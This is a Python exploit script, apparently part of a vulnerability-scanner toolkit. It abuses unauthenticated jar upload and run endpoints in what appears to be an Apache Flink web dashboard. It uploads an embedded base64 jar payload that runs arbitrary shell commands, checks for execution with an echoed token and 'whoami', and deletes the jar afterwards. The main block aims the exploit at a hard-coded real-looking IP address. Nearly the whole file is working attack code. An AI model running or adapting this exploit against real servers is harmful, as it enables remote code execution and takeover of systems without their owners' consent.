#!/usr/bin/env python3

'''
name: 任意Jar包上传导致远程代码执行漏洞
description: 任意Jar包上传导致远程代码执行漏洞
'''

import re
import time
import json
import base64
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Upload_Jar_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
        }
        self.upload_jar_name = 'check.jar'
        self.capta = get_capta()

    def check_jar_exsits(self):
        list_jar_url = self.url + "/jars/"
        try:
            response = request.get(list_jar_url, headers = self.headers)
            if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
                r = json.loads(response.text)
                for upload_file in r['files']:
                    if str(upload_file['id']).endswith('{}'.format(self.upload_jar_name)):
                        return upload_file['id']
        except Exception as e:
            print(e)
            return False

    def upload_execute_jar(self):
        upload_jar_url = self.url + "/jars/upload"
        file_content = base64.b64decode('UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAAAAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAKVkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLvCGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujCQNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJNaFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Qo0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNMKA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjoRF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqps0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJcVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEsOJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6EjptI4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IOYg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1bU+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQAFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUGAAAAAAMAAwC4AAAArgQAAAAA')
        files = {
            'jarfile': (self.upload_jar_name, file_content, 'application/octet-stream')
            }
        try:
            req = request.post(upload_jar_url, headers = self.headers, files = files)
            return True
        except Exception as e:
            print(e)
            return False

    def delete_exists_jar(self, jar_hash_name):
        single_jar_url = self.url + "/jars/" + jar_hash_name
        try:
            response = request.delete(single_jar_url, headers = self.headers)
            if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
                return True
        except Exception as e:
            print(e)
            return False

    def execute_cmd(self, command):
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0 Safari/537.36',
            'Content-Type': 'application/json;charset=utf-8',
        }
        jar_hash_name = self.check_jar_exsits()
        data = r'{"entryClass":"Execute","parallelism":null,"programArgs":"\"%s\"","savepointPath":null,"allowNonRestoredState":null}' % command
        if jar_hash_name:
            execute_cmd_url = self.url + '/jars/' + jar_hash_name + '/run?entry-class=Execute&program-args="%s"' % command
        else:
            self.upload_execute_jar()
            jar_hash_name = self.check_jar_exsits()
            if jar_hash_name:
                execute_cmd_url = self.url + '/jars/'+ jar_hash_name + '/run?entry-class=Execute&program-args="%s"' % command
            else:
                return False
        try:
            r1 = request.post(execute_cmd_url, headers = headers, data = data)
            match = re.findall('\|@\|(.*?)\|@\|', r1.text)
            self.delete_exists_jar(jar_hash_name)
            if match:
                if match[0][:-2]:
                    return match[0][:-2]
                else:
                    return "result is blank"
            else:
                print('不存在任意Jar包上传导致远程代码执行漏洞')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

    def run(self):
        check_str = self.execute_cmd('echo ' + self.capta)
        if check_str == self.capta:
            print('存在任意Jar包上传导致远程代码执行漏洞')
            cmd_str = self.execute_cmd('whoami')
            print('执行whoami漏洞结果是', cmd_str)
            return True
        elif check_str == "result is blank":
            print('result is blank')
            print('不存在任意Jar包上传导致远程代码执行漏洞')
            return False
        else:
            print('不存在任意Jar包上传导致远程代码执行漏洞')
            return False

if __name__ == '__main__':
    upload_jar = Upload_Jar_BaseVerify('http://134.209.168.210:8081')
    upload_jar.run()





